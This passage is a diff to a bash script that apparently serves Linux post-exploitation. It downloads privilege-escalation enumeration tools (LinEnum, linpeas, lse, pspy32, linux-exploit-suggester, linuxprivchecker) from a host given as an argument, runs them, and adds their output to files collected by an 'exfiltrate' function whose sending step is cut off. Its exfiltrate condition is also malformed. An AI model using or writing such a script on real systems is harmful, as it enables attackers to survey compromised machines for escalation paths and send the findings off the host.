@@ -117,8 +117,8 @@ download()
 		echo -e "\n#### Downloading LinEnum.sh ####\n"
 		$dload $1/LinEnum.sh
 	
-		echo -e "\n#### Downloading psspy ####\n"
-		$dload $1/psspy
+		echo -e "\n#### Downloading psspy32 ####\n"
+		$dload $1/psspy32
 	
 		echo -e "\n#### Downloading linux-priv-checker ####\n"
 		$dload $1/linuxprivchecker.py
@@ -128,26 +128,33 @@ download()
 	
 		echo -e "\n#### Downloading lse.sh ####\n"
 		$dload $1/lse.sh
+		
+		echo -e "\n#### Downloading linux-exploit-suggester.sh ####\n"
+		$dload $1/linux-exploit-suggester.sh
 	fi
 }
 
 # Execute enum scripts
 execute()
 {
-	scripts=("LinEnum.sh" "linpeas.sh" "lse.sh")
+	scripts=("LinEnum.sh" "linpeas.sh" "lse.sh" "linux-exploit-suggester.sh")
 	
 	for script in "${scripts[@]}"
 	do
 		echo -e "\n#### Run $script ####\n"
 		bash $script > $script.txt
 	done
+	
+	echo -e "\n#### Run linuxprivchecker.py ####\n"
+	python linuxprivchecker.py > linuxprivchecker.py.txt
+	
 }
 
 # Exfiltrate enum script results
 exfiltrate()
 {
 	if [ $dload -eq "curl" ] || [  $dload != "wget" ] || [  $dload != "null" ]; then
-		files=("LinEnum.sh.txt" "linpeas.sh.txt" "lse.sh.txt")
+		files=("LinEnum.sh.txt" "linpeas.sh.txt" "lse.sh.txt" "linuxprivchecker.py.txt")
 	
 		for file in "${files[@]}"
 		do
